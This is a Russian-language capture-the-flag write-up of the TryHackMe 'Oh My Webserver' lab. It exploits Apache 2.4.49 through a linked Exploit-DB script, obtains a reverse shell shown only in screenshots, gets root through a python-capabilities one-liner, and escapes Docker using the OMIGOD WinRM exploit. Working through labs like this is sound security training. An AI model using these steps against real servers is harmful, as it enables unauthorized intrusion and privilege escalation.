# Road

:white_check_mark:  [**Apache**](#apache)

:white_check_mark: [**Capabilities(python)**](#capabilities)

:white_check_mark: [**WinRM**](#win_rm)

:white_check_mark: [**Docker**](#docker)
___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV server.thm
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-server-header: Apache/2.4.49 (Unix)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Oh_My_Webserver/1.png)

## Getting shell

<a name="apache"></a>

Сервер поднят на Apache 2.4.49. Найдем [уязвимость](https://www.exploit-db.com/exploits/50383) для него на exploit-db.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Oh_My_Webserver/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Oh_My_Webserver/3.png)

Клонируем эксплоит и используем.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Oh_My_Webserver/4.png)

Видим, что можем использовать команды. Прокинем обратную оболочку

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Oh_My_Webserver/5.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Oh_My_Webserver/6.png)

## Privilege escalation

Используем **linpeas**, чтобы найти что-нибудь интересное.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Oh_My_Webserver/7.png)

<a name="capabilities"></a>

Видим, что можем проэсплуатировать **capabilities** питона. Используем для этого [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities).
```
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

<a name="docker"></a>

## Docker escape

Получаем рут. Мы находимся в докере. Ищем способ выйти из него. Снова посмотрим на результат работы **linpeas**. Ничего, кроме внутреннего ip-адресса не найдена. Попробуем установить nmap и просканировать порты.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Oh_My_Webserver/8.png)

```
nmap -p- 172.17.0.1
```

```
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:99:85:EF:78 (Unknown)
```

<a name="win_rm"></a>

Порты 5985, 5986 относятся к **WinRM**. Проэксплуатируем уязвимость [эксплоитом](https://github.com/AlteredSecurity/CVE-2021-38647).

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Oh_My_Webserver/9.png)

Мы вышли из докера.
